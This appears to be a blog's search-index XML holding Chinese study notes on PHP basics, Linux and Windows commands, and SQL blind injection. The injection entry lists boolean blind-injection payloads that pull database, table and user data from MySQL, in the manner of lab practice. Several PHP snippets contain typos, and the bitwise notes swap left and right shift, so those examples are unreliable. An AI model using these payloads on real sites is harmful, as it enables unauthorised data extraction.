    <title><![CDATA[php常量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%B8%B8%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php常量1.常量：一旦声明，这个常量的值就不会被改变 2.如果常量没有声明，则常量名在使用时，会自动转为字符串（效率很低） 3.常量名称，不要加$符号 4.常量名称，默认是区分大小写的（变量也区分大小写），习惯上常量名称要全部大写 5.可以使用define()第三个参数来决定是否让这个常量名称区分大小写 true false。例如：define(&quot;QA&quot;,123,true); 6.常量的值只支持标量数据类型（整型，浮点型，字符型...,数组不是标量数据类型）]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php变量函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php变量函数php支持变量函数的概念。这意味着如果一个变量名后有圆括号，php将寻找与变量的值同名的函数，并且将尝试执行它。除了别的事情以外，这个可以被用于实现回调函数，函数表等等。变量函数不能用于语言结构，例如echo(),print(),unset(),isset(),empty(),include(),require()以及类似的语句。需要使用自己的外壳函数来将这些结构用作变量函数。 变量函数示例： 1234567891011121314151617181920212223&lt;?phpfunction foo()&#123; echo "In foo()&lt;br /&gt;\n";&#125;function bar($arg = '')&#123; echo "In bar();argument was '$arg'.&lt;br /&gt;\n";&#125;//This is a wrapper function around echofunction echoit($string)&#123; echo $string;&#125;$func = 'foo';$func(); //这里调用foo()$func = 'bar';$func('test'); //这里调用bar()$func = 'echoit';$func('test'); //这里调用echoit() 还可利用变量函数的特性来调用一个对象的方法。 变量方法范例： 1234567891011121314151617181920&lt;?phpclass Foo&#123; function Variable() &#123; $name = 'Bar'; $this-&gt;$name();//这是Bar()方法 &#125; functoin Bar() &#123; echo "这是Bar"; &#125;&#125;$foo = new Foo();$funcname = "Variable";$foo-&gt;$funcname(); //这是$foo-&gt;Variable()?&gt;]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php string函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%20string%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[string函数1.chr() chr()函数从指定的ascii值返回字符。 2.strlen() 计算字符串的长度，如果是中文的字符则代表两个长度。 3.trim() 去除字符串的两边空格。 4.strtolower() 把字符串转换为小写。 5.strtoupper() 把字符串转换为大写。 6.htmlspecialchars() 把特殊字符转换为HTML编码。 7.strrev() 反转字符。 8.strpos() 找出字符第一次出现的位置，下标从0开始，区分大小写strpos(&apos;字符串&apos;，要找的字符) mixed strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) 返回 needle 在 haystack 中首次出现的数字位置。 9.stristr() 不区分大小写，找到指定字符的位置，然后，进行截取，一直截取到末尾，包括字符本身 10.strrchr() 找到字符最后出现的位置，区分大小写，并截取到末尾 11.str_replace() 字符串替换函数。 12.substr() 截取字符串函数 substr(&apos;字符串&apos;,开始位置，结束位置) 如果结束位置没有填写，则默认截取的结尾 13.join() 把数组连接成为字符串]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql盲注笔记]]></title>
    <url>%2F2018%2F10%2F25%2Fmysql%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[基于布尔sql盲注———构造逻辑判断截取字符串相关函数： left(database(),1)&gt;’s’ //left()函数Explain：database()显示数据库名称，left(a,b)从左侧截取a的前b位 ascii(substr((select table_name information_schema.tables where table_schema=database() limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数Explain:substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。ascii()将某个字符转换为ascii值。 ascii(substr((select database()),1,1))=98 ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))&gt;98%23 //ord()函数，mid()函数Explain:mid(a,b,c)从位置b开始，截取a字符串的c位 ord()函数同ascii()，将字符转为ascii值。 regexp 正则注入用法介绍：select user() regexp ‘^[a-z]’;Explain:正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’来进行。当正确的时候显示结果为1，不正确的时候显示结果为0.]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux命令详解]]></title>
    <url>%2F2018%2F10%2F25%2Flinux%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[linux命令详解linux命令的通用格式命令 [选项] [参数] 选项及参数的含义：选项：用于调节命令的功能 &gt;以&quot;-&quot;引导短格式选项（单个字符），例如&quot;-l&quot; &gt;以&quot;--&quot;引导长格式选项（多个字符），例如&quot;--color&quot; &gt;多个短格式选项可以写在一起，只用一个&quot;-&quot;引导，例如&quot;-al&quot; 参数：命令操作的对象，如文件，目录名等。例如&quot;ls -l /home 命令行编辑的几个辅助操作:反斜杠&quot;\&quot;;强制换行 快捷键 ctrl+U 清空至行首 ctrl+K 清空至行尾 ctrl+L 清屏 ctrl+C 取消本次命令编辑 ctrl+alt+F2 切换图形界面或命令行界面 --help 查看帮助 uname命令：-a 显示主机名，内核版本，硬件平台等详细信息。 -r 显示内核版本 hostname命令：查看主机名 关机命令：halt 关机 shutdown -h now 现在关机 poweroff 关机 shutdown -r 重启 reboot 重启 目录切换命令：cd 切换目录 pwd 查看当前所在目录 ls命令：列表显示目录内容 格式： ls [选项] .....[目录或文件名] 选项： -l 以长格式显示 -a 显示所有字目录和文件信息，包括隐藏文件 -A 类似于&quot;-a&quot;，但不显示&quot;.&quot;和&quot;..&quot;目录信息。 -d 显示目录本身的属性 -h 以更易读的字节单位（K,M 等）显示信息 -R 递归显示内容 --color 以颜色区分不同类型文件 du命令：统计目录及文件的空间占用情况 格式： du [选项].....[目录或文件名] 选项： -a 统计时包括所有的文件，而不仅仅只统计目录 -h 以更易读的字节单位（K,M 等）显示信息 -s 只统计每个参数所占用空间总大小。 mkdir命令：创建新的目录 格式： mkdir [-p] [路径] 目录名 touch命令：创建文件，或更新文件的时间标记 格式： touch 文件名 ln命令：为文件或目录建立链接。Link 格式： ln [-s] 源文件或目录....链接文件或目标目录 选项： -s 建立符号链接文件（省略此项建立硬链接） cp命令：复制 文件或目录 格式： cp [选项] 源文件或目录....目标文件或目录 选项： -r 递归复制整个目录树 -p 保持源文件的属性不变 -f 强制覆盖目标同名文件或目录 -i 需要覆盖文件或目录时进行提醒 rm命令：删除 文件或目录 格式： rm [选项]... 文件或目录 选项： -f 强行删除文件或目录，不进行提醒 -i 删除文件或目录时提醒用户确认 -r 递归删除整个目录树 防火墙命令：1) Linux操作系统中永久性生效，重启后不会复原 开启： chkconfig iptables on 关闭： chkconfig iptables off 2) 即时生效，重启后复原 开启： service iptables start 关闭： service iptables stop 需要说明的是对于Linux操作系统中的其它服务都可以用以上命令执行开启和关闭操作。 在开启了防火墙时，做如下设置，开启相关端口， 修改/etc/sysconfig/iptables 文件，添加以下内容： -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT]]></content>
      <categories>
        <category>命令学习</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows命令]]></title>
    <url>%2F2018%2F10%2F25%2Fwindows%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[windows命令windows常用快捷键：F1 显示当前程序或者windows的帮助内容 F2 当你选中一个文件的话，这意味着“重命名” F3 当你在桌面上的时候是打开“查找：所有文件”对话框 ctrl+F4 关闭当前应用程序中的当前文本 F5 刷新 ctrl+F5 强行刷新 ctrl+F6 切换到当前 ipconfig命令：ipconfig /release------释放IP ipconfig /renew--------重新获取IP 目录（文件）操作： md 目录名------------创建目录 rd 目录名------------删除文件夹 ren 原文件名 新文件名---------重命名 del 文件名或目录名------------删除文件或文件夹 copy ------------------------复制文件 move ------------------------移动文件 tree ------------------------树形列出文件夹结构 type ------------------------打开文件 start -----------------------打开文件或网站 conpy con c:\123.txt ----创建一个123.txt，ctrl+z退出写入 net start命令：net start---------查看开启了哪些服务 net start 服务名---开启特定服务 net stop 服务名 ---关闭特定服务 net user命令：net user 用户名 密码 /add-------------------建立用户 net user guest /active:yes-----------------激活guest用户 net user-----------------------------------查看有哪些用户 net user 账户名-----------------------------查看账户属性 net locaLGroup administrators 用户名 /add---把“用户名”添加到管理员中使其具有管理员权限 net user guest 12345-----------------------用guest用户登录后，将密码改为12345 net password 密码--------------------------更改系统登录密码 win键+R 【输入内容】cmd------------------命令窗口 mstsc----------------远程桌面连接窗口 gpedit.msc-----------打开本地组策略 services.msc---------打开服务窗口 notepad--------------打开记事本 regedit--------------打开注册表 control--------------打开控制面板]]></content>
      <categories>
        <category>命令学习</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php位运算]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E4%BD%8D%E8%BF%90%E7%AE%97%2F</url>
    <content type="text"><![CDATA[php位运算&amp; 换位与 只有参与运算的两位都为1时，运算结果才为1，否则为0 $a &amp; $b | 换位或 只有参与运算的两位都为0时，运算结果才为0，否则为1. $a &amp; $b ^ 换位异或 只有参与运算的两位不同，运算结果才为1，否则为0 ^$b ~ 按位非 将用二进制表示的操作中的1变成0,0变成1 ~$a &lt;&lt; 左移 将左边的操作数在内存中的二进制数据右移右边操作数指定的位数，右边移空的部分补上0 $a&lt;&lt;$b &gt;&gt; 右移 将左移的操作数在内存中的二进制数据左移右边操作数指定的位数。左边移空的部分补上0 $a&gt;&gt;$b]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php匿名函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php匿名函数 匿名函数。也叫闭包函数，允许临时创建一个没有指定名称的函数。最经常用作回调函数参数的值。当然，也有其他应用的情况。 匿名函数目前是通过Closure类来实现的。 匿名函数示例： 123456&lt;?php echo preg_repllace_callback('~-([a-z])~', function($match)&#123; return strtoupper($match[1]);&#125;,'hello-world');//输出 helloworld?&gt; 闭包函数也可以作为变量的值来使用。php会自动把此种表达式转换成内置类Closure的对象实例。把一个Closure对象赋值给一个变量的方式与普通变量赋值的语法是一样的，最后也要加上分号： 匿名函数变量赋值示例： 123456789&lt;?php$gree = function($name);&#123; print("Hello %s\r\n", $name);&#125;;$greet('World');$greet('PHP');?&gt; 闭包可以从父作用域中继承变量。任何此类变量都应该用use语言结构传递进去。php7.1起，不能传入此类变量；superglobals、$this或者和参数重名。 从父作用域继承变量： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$message = 'hello';//没有"use"$example = function ()&#123; var_dump($message);&#125;;echo $example();//继承$message$example = function () use ($message)&#123; var_dump($message);&#125;;echo $example();// Inherited variable's value is from when the function// is defined, not when called$message = 'world';echo $example();// Reset message$message = 'hello';// Inherit by-reference$example = function () use (&amp;$message) &#123; var_dump($message);&#125;;echo $example();// The changed value in the parent scope// is reflected inside the function call$message = 'world';echo $example();// Closures can also accept regular arguments$example = function ($arg) use ($message) &#123; var_dump($arg . ' ' . $message);&#125;;$example("hello");?&gt; 以上例子的输出类似于： Notice: Undefined variable: message in /example.php on line 6 NULL string(5) &quot;hello&quot; string(5) &quot;hello&quot; string(5) &quot;hello&quot; string(5) &quot;world&quot; string(11) &quot;hello world&quot;]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php魔术常量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php魔术变量 php向它运行的任何脚本提供了大量的预定义常量 不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。 有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 例如：LINE的值就依赖于它在脚本中所处的行来决定。这些特殊的常量不区分大小写，如下： LINE__LINE__文件中的当前行号。 实例 &lt;?php echo &apos;这是第 &quot;&apos; . __LINE__ . &apos; &quot;行&apos;; ?&gt; 以上实例输出结果为： 这是第 &quot;2&quot; 行 FILE __FILE__ 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。 自php 4.0.2起，FILE总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。 实例 &lt;?php echo &apos;该文件位于 &quot;&apos; .__FILE__. &apos; &quot;&apos;; ?&gt; 以上实例输出结果为： 该文件位于 &quot;E:\wamp\www\test\index.php&quot; DIR__DIR__ 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。 它等价于dirname(FILE)。除非是根目录，否则目录中名不包括末尾斜杠。（php 5.3.0中新增） 实例 &lt;?php echo &apos;该文件位于 &quot;&apos; .__DIR__.&apos;&quot; &apos;; ?&gt; 以上实例输出结果为： 该文件位于 &quot;E:\wamp\www\test&quot; FUNCTION__FUNCTION__函数名称（php 4.3.0新加）。自php5 起本常量返回该函数被定义时的名字（区分大小写）。在php4 中该值总是小写字母的。 实例 &lt;?php function test(){ echo &apos;函数名为：&apos; .__FUNCTION__; } test(); ?&gt; 以上实例输出结果为： 函数名为：test]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
</search>
